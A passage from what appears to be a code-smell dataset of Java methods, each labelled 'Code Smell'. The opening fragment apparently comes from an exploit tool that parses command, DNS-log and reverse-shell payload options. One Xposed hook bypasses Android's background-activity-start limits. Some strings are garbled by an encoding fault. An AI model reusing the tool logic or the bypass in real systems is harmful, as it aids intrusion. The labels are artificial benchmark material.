    }
    if (gadgetType == GadgetType.urldns) {
      String url=""http://"" + base.substring(base.lastIndexOf(""/"") + 1);
      System.out.println(""[+] URL: "" + url);
      params=new String[]{url};
      return;
    }
    int thirdIndex=base.indexOf(""/"",secondIndex + 1);
    if (thirdIndex < 0)     thirdIndex=base.length();
    try {
      payloadType=PayloadType.valueOf(base.substring(secondIndex + 1,thirdIndex).toLowerCase());
      System.out.println(""[+] PayloadType: "" + payloadType);
    }
 catch (    IllegalArgumentException e) {
      throw new UnSupportedPayloadTypeException(""UnSupportedPayloadType: "" + base.substring(secondIndex + 1,thirdIndex));
    }
switch (payloadType) {
case dnslog:
      String url=base.substring(base.lastIndexOf(""/"") + 1);
    System.out.println(""[+] URL: "" + url);
  params=new String[]{url};
break;
case command:
String cmd=Util.getCmdFromBase(base);
System.out.println(""[+] Command: "" + cmd);
params=new String[]{cmd};
break;
case reverseshell:
String[] results=Util.getIPAndPortFromBase(base);
System.out.println(""[+] IP: "" + results[0]);
System.out.println(""[+] Port: "" + results[1]);
params=results;
break;
}
}
 catch (Exception e) {
if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;
if (e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException)e;
throw new IncorrectParamsException(""Incorrect params: "" + base);
}
}",1,Code Smell
"private FilterPredicate buildPredicate(LakeSoulTableColumnHandle column,Domain domain){
  String name=column.getColumnName();
  Type type=column.getColumnType();
  if (domain.getValues().isNone() && domain.isNullAllowed()) {
    return eq(type,name,null);
  }
  if (domain.getValues().isAll() && !domain.isNullAllowed()) {
    FilterPredicate predicate=eq(type,name,null);
    return predicate == null ? null : FilterApi.not(predicate);
  }
  List<Object> singleValues=new ArrayList<>();
  List<FilterPredicate> disjuncts=new ArrayList<>();
  for (  Range range : domain.getValues().getRanges().getOrderedRanges()) {
    if (range.isSingleValue()) {
      singleValues.add(range.getSingleValue());
    }
 else {
      FilterPredicate rangeConjuncts=null;
      if (!range.isLowUnbounded()) {
        if (range.isLowInclusive()) {
          rangeConjuncts=gte(type,name,range.getLowBoundedValue());
        }
 else {
          rangeConjuncts=gt(type,name,range.getLowBoundedValue());
        }
      }
      if (!range.isHighUnbounded()) {
        if (range.isHighInclusive()) {
          rangeConjuncts=lte(type,name,range.getHighBoundedValue());
        }
 else {
          rangeConjuncts=lt(type,name,range.getHighBoundedValue());
        }
      }
      if (rangeConjuncts != null) {
        disjuncts.add(rangeConjuncts);
      }
    }
  }
  if (!singleValues.isEmpty()) {
    for (    Object value : singleValues) {
      disjuncts.add(eq(type,name,value));
    }
  }
  if (domain.isNullAllowed()) {
    disjuncts.add(eq(type,name,null));
  }
  Optional<FilterPredicate> predicate=disjuncts.stream().filter(Objects::nonNull).reduce(FilterApi::or);
  return predicate.orElse(null);
}
",1,Code Smell
"private void backgroundActivity(ClassLoader classLoader){
  try {
    findAndHookMethod(""com.android.server.wm.ActivityStarter"",classLoader,""shouldAbortBackgroundActivityStart"",int.class,int.class,String.class,int.class,int.class,""com.android.server.wm.WindowProcessController"",""com.android.server.am.PendingIntentRecord"",boolean.class,Intent.class,ActivityOptions.class,new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        String pkg=(String)param.args[2];
        if (pkg == null)         return;
        if (ProjectApi.mAppModulePkg.equals(pkg)) {
          param.setResult(false);
        }
      }
    }
);
  }
 catch (  Throwable e) {
    findAndHookMethod(""com.android.server.wm.BackgroundActivityStartController"",classLoader,""checkBackgroundActivityStart"",int.class,int.class,String.class,int.class,int.class,""com.android.server.wm.WindowProcessController"",""com.android.server.am.PendingIntentRecord"",""android.app.BackgroundStartPrivileges"",Intent.class,ActivityOptions.class,new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        String pkg=(String)param.args[2];
        if (pkg == null)         return;
        if (ProjectApi.mAppModulePkg.equals(pkg)) {
          param.setResult(1);
        }
      }
    }
);
  }
  hookAllMethods(""com.android.server.wm.ActivityStarterImpl"",classLoader,""isAllowedStartActivity"",new MethodHook(){
    @Override protected void before(    MethodHookParam param){
      int count=-1;
      for (      Object clz : param.args) {
        count=count + 1;
        if (clz instanceof String) {
          break;
        }
      }
      String pkg=(String)param.args[count];
      if (pkg == null)       return;
      if (ProjectApi.mAppModulePkg.equals(pkg)) {
        param.setResult(true);
      }
    }
  }
);
}",1,Code Smell
"public static ColumnVector createColumnVector(ValueVector vector,LogicalType fieldType){
  if (vector instanceof TinyIntVector) {
    return new ArrowTinyIntColumnVector((TinyIntVector)vector);
  }
 else   if (vector instanceof SmallIntVector) {
    return new ArrowSmallIntColumnVector((SmallIntVector)vector);
  }
 else   if (vector instanceof IntVector) {
    return new ArrowIntColumnVector((IntVector)vector);
  }
 else   if (vector instanceof BigIntVector) {
    return new ArrowBigIntColumnVector((BigIntVector)vector);
  }
 else   if (vector instanceof BitVector) {
    return new ArrowBooleanColumnVector((BitVector)vector);
  }
 else   if (vector instanceof Float4Vector) {
    return new ArrowFloatColumnVector((Float4Vector)vector);
  }
 else   if (vector instanceof Float8Vector) {
    return new ArrowDoubleColumnVector((Float8Vector)vector);
  }
 else   if (vector instanceof VarCharVector) {
    return new ArrowVarCharColumnVector((VarCharVector)vector);
  }
 else   if (vector instanceof FixedSizeBinaryVector) {
    return new ArrowBinaryColumnVector((FixedSizeBinaryVector)vector);
  }
 else   if (vector instanceof VarBinaryVector) {
    return new ArrowVarBinaryColumnVector((VarBinaryVector)vector);
  }
 else   if (vector instanceof DecimalVector) {
    return new ArrowDecimalColumnVector((DecimalVector)vector);
  }
 else   if (vector instanceof DateDayVector) {
    return new ArrowDateColumnVector((DateDayVector)vector);
  }
 else   if (vector instanceof TimeSecVector || vector instanceof TimeMilliVector || vector instanceof TimeMicroVector|| vector instanceof TimeNanoVector) {
    return new ArrowTimeColumnVector(vector);
  }
 else   if (vector instanceof TimeStampVector) {
    return new ArrowTimestampColumnVector(vector);
  }
 else   if (vector instanceof MapVector) {
    MapVector mapVector=(MapVector)vector;
    LogicalType keyType=((MapType)fieldType).getKeyType();
    LogicalType valueType=((MapType)fieldType).getValueType();
    StructVector structVector=(StructVector)mapVector.getDataVector();
    return new ArrowMapColumnVector(mapVector,createColumnVector(structVector.getChild(MapVector.KEY_NAME),keyType),createColumnVector(structVector.getChild(MapVector.VALUE_NAME),valueType));
  }
 else   if (vector instanceof ListVector) {
    ListVector listVector=(ListVector)vector;
    return new ArrowArrayColumnVector(listVector,createColumnVector(listVector.getDataVector(),((ArrayType)fieldType).getElementType()));
  }
 else   if (vector instanceof StructVector) {
    StructVector structVector=(StructVector)vector;
    ColumnVector[] fieldColumns=new ColumnVector[structVector.size()];
    for (int i=0; i < fieldColumns.length; ++i) {
      fieldColumns[i]=createColumnVector(structVector.getVectorById(i),((RowType)fieldType).getTypeAt(i));
    }
    return new ArrowRowColumnVector(structVector,fieldColumns);
  }
 else   if (vector instanceof NullVector) {
    return ArrowNullColumnVector.INSTANCE;
  }
 else {
    throw new UnsupportedOperationException(String.format(""Unsupported type %s."",fieldType));
  }
}",1,Code Smell
"private static <A extends Aggregation>void route(Bucket bucket,A a){
  if (a instanceof Terms) {
    bucket.setBuckets(terms(a));
  }
 else   if (a instanceof Range) {
    bucket.setBuckets(range(a));
  }
 else   if (a instanceof Histogram) {
    bucket.setBuckets(range(a));
  }
 else   if (a instanceof Avg) {
    bucket.setAvg(avg(a));
  }
 else   if (a instanceof Min) {
    bucket.setMin(min(a));
  }
 else   if (a instanceof Max) {
    bucket.setMax(max(a));
  }
 else   if (a instanceof Sum) {
    bucket.setSum(sum(a));
  }
 else   if (a instanceof Stats) {
    stats(bucket,a);
  }
 else   if (a instanceof ValueCount) {
    bucket.setValueCount(count(a));
  }
 else {
    throw new UnsupportedOperationException(""涓嶆敮鎸佺殑鑱氬悎绫诲瀷"");
  }
}
",1,Code Smell
"public static String analysisShowPopupInfo(StackTraceElement[] stackTraceElements){
  if (stackTraceElements == null || CodeLocator.sGlobalConfig == null) {
    return null;
  }
  final CodeLocatorConfig config=CodeLocator.sGlobalConfig;
  try {
    StackTraceElement findElement=null;
    for (int i=config.getSkipSystemTraceCount(); i < stackTraceElements.length && i < config.getViewMaxLoopCount(); i++) {
      final StackTraceElement stackTraceElement=stackTraceElements[i];
      final String currentClassName=stackTraceElement.getClassName();
      final String currentMethodName=stackTraceElement.getMethodName();
      final String fileName=stackTraceElement.getFileName();
      if (fileName == null || currentClassName == null || config.getPopupIgnoreByKeyWords().contains(currentClassName)) {
        continue;
      }
 else {
        boolean containsKeyword=false;
        for (        String keyword : config.getPopupIgnoreByKeyWords()) {
          if (currentClassName.contains(keyword) || (currentMethodName != null && currentMethodName.contains(keyword))) {
            containsKeyword=true;
            break;
          }
        }
        if (containsKeyword) {
          continue;
        }
      }
      findElement=stackTraceElement;
      break;
    }
    if (findElement == null) {
      return null;
    }
    return getTagInfoByElement(findElement);
  }
 catch (  Throwable t) {
    Log.d(CodeLocator.TAG,""analysisShowToastInfo Error "" + Log.getStackTraceString(t));
  }
  return null;
}
",1,Code Smell
"@Override public void onConnectionStateChanged(int newState,boolean inTransition){
  AndroidUtilities.runOnUIThread(() -> {
    if (newState == STATE_ESTABLISHED) {
      if (callStartTime == 0) {
        callStartTime=SystemClock.elapsedRealtime();
      }
    }
    if (newState == STATE_FAILED) {
      callFailed();
      return;
    }
    if (newState == STATE_ESTABLISHED) {
      if (connectingSoundRunnable != null) {
        AndroidUtilities.cancelRunOnUIThread(connectingSoundRunnable);
        connectingSoundRunnable=null;
      }
      Utilities.globalQueue.postRunnable(() -> {
        if (spPlayId != 0) {
          soundPool.stop(spPlayId);
          spPlayId=0;
        }
      }
);
      if (groupCall == null && !wasEstablished) {
        wasEstablished=true;
        if (!isProximityNear && !privateCall.video) {
          Vibrator vibrator=(Vibrator)getSystemService(VIBRATOR_SERVICE);
          if (vibrator.hasVibrator()) {
            vibrator.vibrate(100);
          }
        }
        AndroidUtilities.runOnUIThread(new Runnable(){
          @Override public void run(){
            if (tgVoip[CAPTURE_DEVICE_CAMERA] != null) {
              StatsController.getInstance(currentAccount).incrementTotalCallsTime(getStatsNetworkType(),5);
              AndroidUtilities.runOnUIThread(this,5000);
            }
          }
        }
,5000);
        if (isOutgoing) {
          StatsController.getInstance(currentAccount).incrementSentItemsCount(getStatsNetworkType(),StatsController.TYPE_CALLS,1);
        }
 else {
          StatsController.getInstance(currentAccount).incrementReceivedItemsCount(getStatsNetworkType(),StatsController.TYPE_CALLS,1);
        }
      }
    }
    if (newState == STATE_RECONNECTING) {
      Utilities.globalQueue.postRunnable(() -> {
        if (spPlayId != 0) {
          soundPool.stop(spPlayId);
        }
        spPlayId=soundPool.play(groupCall != null ? spVoiceChatConnecting : spConnectingId,1,1,0,-1,1);
      }
);
    }
    dispatchStateChanged(newState);
  }
);
}",1,Code Smell
"@EventHandler private void onEntityRemoved(EntityRemovedEvent event){
  if (!event.entity.getUuid().equals(mc.player.getUuid()) && entities.get().contains(event.entity.getType()) && visualRange.get()&& this.event.get() != Event.Spawn) {
    if (event.entity instanceof PlayerEntity) {
      if ((!visualRangeIgnoreFriends.get() || !Friends.get().isFriend(((PlayerEntity)event.entity))) && (!visualRangeIgnoreFakes.get() || !(event.entity instanceof FakePlayerEntity))) {
        ChatUtils.sendMsg(event.entity.getId() + 100,Formatting.GRAY,""(highlight)%s(default) has left your visual range!"",event.entity.getName().getString());
        if (visualMakeSound.get())         mc.world.playSoundFromEntity(mc.player,mc.player,SoundEvents.ENTITY_EXPERIENCE_ORB_PICKUP,SoundCategory.AMBIENT,3.0F,1.0F);
      }
    }
 else {
      MutableText text=Text.literal(event.entity.getType().getName().getString()).formatted(Formatting.WHITE);
      text.append(Text.literal("" has despawned at "").formatted(Formatting.GRAY));
      text.append(formatCoords(event.entity.getPos()));
      text.append(Text.literal(""."").formatted(Formatting.GRAY));
      info(text);
    }
  }
  if (pearl.get()) {
    Entity e=event.entity;
    int i=e.getId();
    if (pearlStartPosMap.containsKey(i)) {
      EnderPearlEntity pearl=(EnderPearlEntity)e;
      if (pearl.getOwner() != null && pearl.getOwner() instanceof PlayerEntity) {
        double d=pearlStartPosMap.get(i).distanceTo(e.getPos());
        if ((!Friends.get().isFriend(p) || !pearlIgnoreFriends.get()) && (!p.equals(mc.player) || !pearlIgnoreOwn.get())) {
          info(""(highlight)%s's(default) pearl landed at %d, %d, %d (highlight)(%.1fm away, travelled %.1fm)(default)."",pearl.getOwner().getName().getString(),pearl.getBlockPos().getX(),pearl.getBlockPos().getY(),pearl.getBlockPos().getZ(),pearl.distanceTo(mc.player),d);
        }
      }
      pearlStartPosMap.remove(i);
    }
  }
}",1,Code Smell
"@EventHandler private static void onTick(TickEvent.Post event){
  GLOBAL.setSpeed(Config.get().rainbowSpeed.get() / 100);
  GLOBAL.getNext();
  for (  Setting<SettingColor> setting : colorSettings) {
    if (setting.module == null || setting.module.isActive())     setting.get().update();
  }
  for (  Setting<List<SettingColor>> setting : colorListSettings) {
    if (setting.module == null || setting.module.isActive()) {
      for (      SettingColor color : setting.get())       color.update();
    }
  }
  for (  SettingColor color : colors) {
    color.update();
  }
  for (  Waypoint waypoint : Waypoints.get()) {
    waypoint.color.get().update();
  }
  if (mc.currentScreen instanceof WidgetScreen) {
    for (    SettingGroup group : GuiThemes.get().settings) {
      for (      Setting<?> setting : group) {
        if (setting instanceof ColorSetting)         ((SettingColor)setting.get()).update();
      }
    }
  }
  for (  Runnable listener : listeners)   listener.run();
}",1,Code Smell
"/** 
 * Asserts that an extension renderer of type  {@code clazz} is not instantiated for {@link DefaultRenderersFactory#EXTENSION_RENDERER_MODE_OFF}, and that it's instantiated in the correct position relative to other renderers of the same type for  {@link DefaultRenderersFactory#EXTENSION_RENDERER_MODE_ON} and {@link DefaultRenderersFactory#EXTENSION_RENDERER_MODE_PREFER}, assuming no other extension renderers can be loaded.
 * @param clazz The extension renderer class.
 * @param type The type of the renderer.
 */
public static void assertExtensionRendererCreated(Class<? extends Renderer> clazz,int type){
  Renderer[] renderers=createRenderers(EXTENSION_RENDERER_MODE_OFF);
  for (  Renderer renderer : renderers) {
    assertThat(renderer).isNotInstanceOf(clazz);
  }
  renderers=createRenderers(EXTENSION_RENDERER_MODE_ON);
  boolean found=false;
  for (  Renderer renderer : renderers) {
    if (!found) {
      if (clazz.isInstance(renderer)) {
        found=true;
      }
    }
 else {
      assertThat(renderer.getTrackType()).isNotEqualTo(type);
    }
  }
  assertThat(found).isTrue();
  renderers=createRenderers(EXTENSION_RENDERER_MODE_PREFER);
  found=false;
  for (  Renderer renderer : renderers) {
    if (!found) {
      if (clazz.isInstance(renderer)) {
        found=true;
      }
 else {
        assertThat(renderer.getTrackType()).isNotEqualTo(type);
      }
    }
 else {
      assertThat(renderer).isNotInstanceOf(clazz);
    }
  }
  assertThat(found).isTrue();
}
",1,Code Smell
"@Around(""controllerBean() || withMetricsAnnotation())"") public Object metrics(ProceedingJoinPoint pjp) throws Throwable {
  MethodSignature signature=(MethodSignature)pjp.getSignature();
  String name=String.format(""銆%s銆戙%s銆"",signature.getDeclaringType().toString(),signature.toLongString());
  Metrics metrics=signature.getMethod().getAnnotation(Metrics.class);
  if (metrics == null) {
    metrics=signature.getMethod().getDeclaringClass().getAnnotation(Metrics.class);
  }
  if (metrics == null) {
@Metrics final class c {
    }
    metrics=c.class.getAnnotation(Metrics.class);
  }
  RequestAttributes requestAttributes=RequestContextHolder.getRequestAttributes();
  if (requestAttributes != null) {
    HttpServletRequest request=((ServletRequestAttributes)requestAttributes).getRequest();
    if (request != null)     name+=String.format(""銆%s銆"",request.getRequestURL().toString());
  }
  if (metrics.logParameters())   log.info(String.format(""銆愬叆鍙傛棩蹇椼戣皟鐢 %s 鐨勫弬鏁版槸锛氥%s銆"",name,objectMapper.writeValueAsString(pjp.getArgs())));
  Object returnValue;
  Instant start=Instant.now();
  try {
    returnValue=pjp.proceed();
    if (metrics.recordSuccessMetrics())     log.info(String.format(""銆愭垚鍔熸墦鐐广戣皟鐢 %s 鎴愬姛锛岃楁椂锛%d ms"",name,Duration.between(start,Instant.now()).toMillis()));
  }
 catch (  Exception ex) {
    if (metrics.recordFailMetrics())     log.info(String.format(""銆愬け璐ユ墦鐐广戣皟鐢 %s 澶辫触锛岃楁椂锛%d ms"",name,Duration.between(start,Instant.now()).toMillis()));
    if (metrics.logException())     log.error(String.format(""銆愬紓甯告棩蹇椼戣皟鐢 %s 鍑虹幇寮傚父锛"",name),ex);
    if (metrics.ignoreException())     returnValue=getDefaultValue(signature.getReturnType());
 else     throw ex;
  }
  if (metrics.logReturn())   log.info(String.format(""銆愬嚭鍙傛棩蹇椼戣皟鐢 %s 鐨勮繑鍥炴槸锛氥%s銆"",name,returnValue));
  return returnValue;
}
",1,Code Smell
"@Override protected void dispatchDraw(Canvas canvas){
  if (menuTextLayout != null) {
    boolean update=false;
    if (expanded && expandProgress != 1f) {
      expandProgress+=16f / 150f;
      if (expandProgress > 1) {
        expandProgress=1f;
      }
 else {
        invalidate();
      }
      update=true;
    }
 else     if (!expanded && expandProgress != 0) {
      expandProgress-=16f / 150f;
      if (expandProgress < 0) {
        expandProgress=0;
      }
 else {
        invalidate();
      }
      update=true;
    }
    float expandProgress=CubicBezierInterpolator.DEFAULT.getInterpolation(this.expandProgress);
    if (update && expandProgress > 0) {
      textPaint.setAlpha((int)(255 * expandProgress));
    }
    if (drawBackgroundDrawable) {
      rectTmp.set(0,0,AndroidUtilities.dp(40) + (menuTextLayout.getWidth() + AndroidUtilities.dp(4)) * expandProgress,getMeasuredHeight());
      canvas.drawRoundRect(rectTmp,AndroidUtilities.dp(16),AndroidUtilities.dp(16),paint);
      backgroundDrawable.setBounds((int)rectTmp.left,(int)rectTmp.top,(int)rectTmp.right,(int)rectTmp.bottom);
      backgroundDrawable.draw(canvas);
    }
    if (isWebView) {
      canvas.save();
      canvas.translate(AndroidUtilities.dp(9.5f),AndroidUtilities.dp(6));
      RLottieDrawable drawable=webViewAnimation;
      drawable.setBounds(0,0,drawable.getMinimumWidth(),drawable.getMinimumHeight());
      drawable.draw(canvas);
      canvas.restore();
      if (drawable.isRunning()) {
        invalidate();
      }
    }
 else {
      canvas.save();
      canvas.translate(AndroidUtilities.dp(8),AndroidUtilities.dp(4));
      backDrawable.draw(canvas);
      canvas.restore();
    }
    if (expandProgress > 0) {
      canvas.save();
      canvas.translate(AndroidUtilities.dp(34),(getMeasuredHeight() - menuTextLayout.getHeight()) / 2f);
      menuTextLayout.draw(canvas);
      canvas.restore();
    }
    if (update) {
      onTranslationChanged((menuTextLayout.getWidth() + AndroidUtilities.dp(4)) * expandProgress);
    }
  }
  super.dispatchDraw(canvas);
}",1,Code Smell
"@UiThread public static void prepareSendingDocuments(AccountInstance accountInstance,ArrayList<String> paths,ArrayList<String> originalPaths,ArrayList<Uri> uris,String caption,String mime,long dialogId,MessageObject replyToMsg,MessageObject replyToTopMsg,TL_stories.StoryItem storyItem,ChatActivity.ReplyQuote quote,MessageObject editingMessageObject,boolean notify,int scheduleDate,InputContentInfoCompat inputContent,String quickReplyShortcut,int quickReplyShortcutId){
  if (paths == null && originalPaths == null && uris == null || paths != null && originalPaths != null && paths.size() != originalPaths.size()) {
    return;
  }
  Utilities.globalQueue.postRunnable(() -> {
    int error=0;
    long[] groupId=new long[1];
    int mediaCount=0;
    Integer[] docType=new Integer[1];
    boolean isEncrypted=DialogObject.isEncryptedDialog(dialogId);
    if (paths != null) {
      int count=paths.size();
      for (int a=0; a < count; a++) {
        final String captionFinal=a == 0 ? caption : null;
        if (!isEncrypted && count > 1 && mediaCount % 10 == 0) {
          if (groupId[0] != 0) {
            finishGroup(accountInstance,groupId[0],scheduleDate);
          }
          groupId[0]=Utilities.random.nextLong();
          mediaCount=0;
        }
        mediaCount++;
        long prevGroupId=groupId[0];
        error=prepareSendingDocumentInternal(accountInstance,paths.get(a),originalPaths.get(a),null,mime,dialogId,replyToMsg,replyToTopMsg,storyItem,quote,null,editingMessageObject,groupId,mediaCount == 10 || a == count - 1,captionFinal,notify,scheduleDate,docType,inputContent == null,quickReplyShortcut,quickReplyShortcutId);
        if (prevGroupId != groupId[0] || groupId[0] == -1) {
          mediaCount=1;
        }
      }
    }
    if (uris != null) {
      groupId[0]=0;
      mediaCount=0;
      int count=uris.size();
      for (int a=0; a < uris.size(); a++) {
        final String captionFinal=a == 0 && (paths == null || paths.size() == 0) ? caption : null;
        if (!isEncrypted && count > 1 && mediaCount % 10 == 0) {
          if (groupId[0] != 0) {
            finishGroup(accountInstance,groupId[0],scheduleDate);
          }
          groupId[0]=Utilities.random.nextLong();
          mediaCount=0;
        }
        mediaCount++;
        long prevGroupId=groupId[0];
        error=prepareSendingDocumentInternal(accountInstance,null,null,uris.get(a),mime,dialogId,replyToMsg,replyToTopMsg,storyItem,quote,null,editingMessageObject,groupId,mediaCount == 10 || a == count - 1,captionFinal,notify,scheduleDate,docType,inputContent == null,quickReplyShortcut,quickReplyShortcutId);
        if (prevGroupId != groupId[0] || groupId[0] == -1) {
          mediaCount=1;
        }
      }
    }
    if (inputContent != null) {
      inputContent.releasePermission();
    }
    handleError(error,accountInstance);
  }
);
}",1,Code Smell
"public Bulletin createUsersBulletin(List<TLRPC.User> users,CharSequence text){
  return createUsersBulletin(users,text,null);
}
public Bulletin createUsersBulletin(List<TLRPC.User> users,CharSequence text,CharSequence subtitle){
  final Bulletin.UsersLayout layout=new Bulletin.UsersLayout(getContext(),subtitle != null,resourcesProvider);
  int count=0;
  if (users != null) {
    for (int i=0; i < users.size(); ++i) {
      if (count >= 3)       break;
      TLRPC.User user=users.get(i);
      if (user != null) {
        layout.avatarsImageView.setCount(++count);
        layout.avatarsImageView.setObject(count - 1,UserConfig.selectedAccount,user);
      }
    }
    if (users.size() == 1) {
      layout.avatarsImageView.setTranslationX(AndroidUtilities.dp(4));
      layout.avatarsImageView.setScaleX(1.2f);
      layout.avatarsImageView.setScaleY(1.2f);
    }
 else {
      layout.avatarsImageView.setScaleX(1f);
      layout.avatarsImageView.setScaleY(1f);
    }
  }
  layout.avatarsImageView.commitTransition(false);
  if (subtitle != null) {
    layout.textView.setSingleLine(true);
    layout.textView.setMaxLines(1);
    layout.textView.setText(text);
    layout.subtitleView.setText(subtitle);
    layout.subtitleView.setSingleLine(true);
    layout.subtitleView.setMaxLines(1);
    if (layout.linearLayout.getLayoutParams() instanceof ViewGroup.MarginLayoutParams) {
      int margin=AndroidUtilities.dp(12 + 56 + 2 - (3 - count) * 12);
      if (LocaleController.isRTL) {
        ((ViewGroup.MarginLayoutParams)layout.linearLayout.getLayoutParams()).rightMargin=margin;
      }
 else {
        ((ViewGroup.MarginLayoutParams)layout.linearLayout.getLayoutParams()).leftMargin=margin;
      }
    }
  }
 else {
    layout.textView.setSingleLine(false);
    layout.textView.setMaxLines(2);
    layout.textView.setText(text);
    if (layout.textView.getLayoutParams() instanceof ViewGroup.MarginLayoutParams) {
      int margin=AndroidUtilities.dp(12 + 56 + 2 - (3 - count) * 12);
      if (LocaleController.isRTL) {
        ((ViewGroup.MarginLayoutParams)layout.textView.getLayoutParams()).rightMargin=margin;
      }
 else {
        ((ViewGroup.MarginLayoutParams)layout.textView.getLayoutParams()).leftMargin=margin;
      }
    }
  }
  return create(layout,Bulletin.DURATION_PROLONG);
}",1,Code Smell
"private void setupTextWatchers(){
  mActionView.addTextChangedListener(new IntentUpdateTextWatcher(mActionView){
    @Override protected void onUpdateIntent(    String modifiedContent){
      if (mMutableIntent != null) {
        mMutableIntent.setAction(modifiedContent);
      }
    }
  }
);
  mDataView.addTextChangedListener(new IntentUpdateTextWatcher(mDataView){
    @Override protected void onUpdateIntent(    String modifiedContent){
      if (mMutableIntent != null) {
        String savedType=mMutableIntent.getType();
        mMutableIntent.setDataAndType(Uri.parse(modifiedContent),savedType);
      }
    }
  }
);
  mTypeView.addTextChangedListener(new IntentUpdateTextWatcher(mTypeView){
    @Override protected void onUpdateIntent(    String modifiedContent){
      if (mMutableIntent != null) {
        String dataString=mMutableIntent.getDataString();
        mMutableIntent.setDataAndType(Uri.parse(dataString),modifiedContent);
      }
    }
  }
);
  mPackageNameView.addTextChangedListener(new IntentUpdateTextWatcher(mPackageNameView){
    @Override protected void onUpdateIntent(    String modifiedContent){
      if (mMutableIntent != null) {
        mMutableIntent.setPackage(TextUtils.isEmpty(modifiedContent) ? null : modifiedContent);
      }
    }
  }
);
  mClassNameView.addTextChangedListener(new IntentUpdateTextWatcher(mClassNameView){
    @Override protected void onUpdateIntent(    String modifiedContent){
      if (mMutableIntent == null)       return;
      String packageName=mMutableIntent.getPackage();
      if (packageName == null && !TextUtils.isEmpty(modifiedContent)) {
        UIUtils.displayShortToast(R.string.set_package_name_first);
        mAreTextWatchersActive=false;
        mClassNameView.setText(null);
        mAreTextWatchersActive=true;
        return;
      }
      if (TextUtils.isEmpty(modifiedContent)) {
        mRequestedComponent=null;
        mMutableIntent.setComponent(null);
        return;
      }
      mRequestedComponent=new ComponentName(packageName,(modifiedContent.startsWith(""."") ? packageName : """") + modifiedContent);
      mMutableIntent.setComponent(mRequestedComponent);
    }
  }
);
  mUriView.addTextChangedListener(new IntentUpdateTextWatcher(mUriView){
    @Override protected void onUpdateIntent(    String modifiedContent){
      mMutableIntent=cloneIntent(modifiedContent);
      showAllIntentData(mUriView);
    }
  }
);
  mIdView.addTextChangedListener(new IntentUpdateTextWatcher(mIdView){
    @Override protected void onUpdateIntent(    String modifiedContent){
      if (mMutableIntent != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
        mMutableIntent.setIdentifier(modifiedContent);
      }
    }
  }
);
  mUserIdEdit.addTextChangedListener(new TextWatcher(){
    @Override public void beforeTextChanged(    CharSequence s,    int start,    int count,    int after){
    }
    @Override public void onTextChanged(    CharSequence s,    int start,    int before,    int count){
      if (s == null)       return;
      try {
        mUserHandle=Integer.decode(s.toString());
        refreshUI();
      }
 catch (      NumberFormatException ignore) {
      }
    }
    @Override public void afterTextChanged(    Editable s){
    }
  }
);
}
",1,Code Smell
"@Override protected Class<?> loadClass(String name,boolean resolve) throws ClassNotFoundException {
synchronized (getClassLoadingLock(name)) {
    Class<?> c=findLoadedClass(name);
    if (c != null) {
      if (resolve) {
        resolveClass(c);
      }
      return c;
    }
    try {
      c=findClass(name);
      if (c != null) {
        if (resolve) {
          resolveClass(c);
        }
        return c;
      }
    }
 catch (    ClassNotFoundException e) {
    }
    try {
      if (getParent() != null) {
        c=super.loadClass(name,resolve);
        if (c != null) {
          if (resolve) {
            resolveClass(c);
          }
          return c;
        }
      }
    }
 catch (    ClassNotFoundException e) {
    }
    try {
      c=findSystemClass(name);
      if (c != null) {
        if (resolve) {
          resolveClass(c);
        }
        return c;
      }
    }
 catch (    ClassNotFoundException e) {
    }
    throw new ClassNotFoundException(name);
  }
}
",1,Code Smell
"private void setFloatingProgressVisible(boolean visible,boolean animate){
  if (floatingButton2 == null || floating2ProgressView == null) {
    return;
  }
  if (animate) {
    if (visible == floatingProgressVisible) {
      return;
    }
    if (floatingProgressAnimator != null) {
      floatingProgressAnimator.cancel();
    }
    floatingProgressVisible=visible;
    floatingProgressAnimator=new AnimatorSet();
    floatingProgressAnimator.playTogether(ObjectAnimator.ofFloat(floatingButton2,View.ALPHA,visible ? 0f : 1f),ObjectAnimator.ofFloat(floatingButton2,View.SCALE_X,visible ? 0.1f : 1f),ObjectAnimator.ofFloat(floatingButton2,View.SCALE_Y,visible ? 0.1f : 1f),ObjectAnimator.ofFloat(floating2ProgressView,View.ALPHA,visible ? 1f : 0f),ObjectAnimator.ofFloat(floating2ProgressView,View.SCALE_X,visible ? 1f : 0.1f),ObjectAnimator.ofFloat(floating2ProgressView,View.SCALE_Y,visible ? 1f : 0.1f));
    floatingProgressAnimator.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationStart(      Animator animation){
        floating2ProgressView.setVisibility(View.VISIBLE);
        floatingButton2.setVisibility(View.VISIBLE);
      }
      @Override public void onAnimationEnd(      Animator animation){
        if (animation == floatingProgressAnimator) {
          if (visible) {
            if (floatingButton2 != null) {
              floatingButton2.setVisibility(View.GONE);
            }
          }
 else {
            if (floatingButton2 != null) {
              floating2ProgressView.setVisibility(View.GONE);
            }
          }
          floatingProgressAnimator=null;
        }
      }
    }
);
    floatingProgressAnimator.setDuration(150);
    floatingProgressAnimator.setInterpolator(CubicBezierInterpolator.DEFAULT);
    floatingProgressAnimator.start();
  }
 else {
    if (floatingProgressAnimator != null) {
      floatingProgressAnimator.cancel();
    }
    floatingProgressVisible=visible;
    if (visible) {
      floatingButton2.setAlpha(0f);
      floatingButton2.setScaleX(0.1f);
      floatingButton2.setScaleY(0.1f);
      floatingButton2.setVisibility(View.GONE);
      floating2ProgressView.setAlpha(1f);
      floating2ProgressView.setScaleX(1f);
      floating2ProgressView.setScaleY(1f);
      floating2ProgressView.setVisibility(View.VISIBLE);
    }
 else {
      floatingButton2.setAlpha(1f);
      floatingButton2.setScaleX(1f);
      floatingButton2.setScaleY(1f);
      floatingButton2.setVisibility(View.VISIBLE);
      floating2ProgressView.setAlpha(0f);
      floating2ProgressView.setScaleX(0.1f);
      floating2ProgressView.setScaleY(0.1f);
      floating2ProgressView.setVisibility(View.GONE);
    }
  }
}",1,Code Smell
"public void processEventBatch(List<Event> events){
  Preconditions.checkNotNull(events,""Event list must not be null"");
  events=interceptorChain.intercept(events);
  Map<Channel,List<Event>> reqChannelQueue=new LinkedHashMap<Channel,List<Event>>();
  Map<Channel,List<Event>> optChannelQueue=new LinkedHashMap<Channel,List<Event>>();
  long tMsgCounterL=1L;
  for (  Event event : events) {
    if (event.getHeaders().containsKey(MSG_COUNTER_KEY)) {
